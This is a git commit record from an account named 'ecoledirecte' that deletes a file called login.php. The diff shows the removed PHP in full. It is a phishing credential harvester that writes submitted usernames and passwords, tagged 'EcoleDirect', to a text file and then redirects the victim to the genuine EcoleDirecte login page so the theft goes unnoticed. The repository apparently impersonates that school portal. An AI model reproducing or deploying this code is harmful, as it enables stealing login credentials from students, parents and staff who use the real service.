2bd698a78f702ded0cbb167bb2691e72737dbcba
ecoledirecte <118852935+ecole-direct@users.noreply.github.com>
2022-11-23 19:59:07 +0000

    Delete login.php

--- login.php
+++
@@ -1,5 +0,0 @@
-<?php
-file_put_contents("usernames.txt", "EcoleDirect: " . $_POST['log'] . ":" . $_POST['pwd'] . "\n", FILE_APPEND);
-header('Location: https://www.ecoledirecte.com/login');
-exit();
-?>
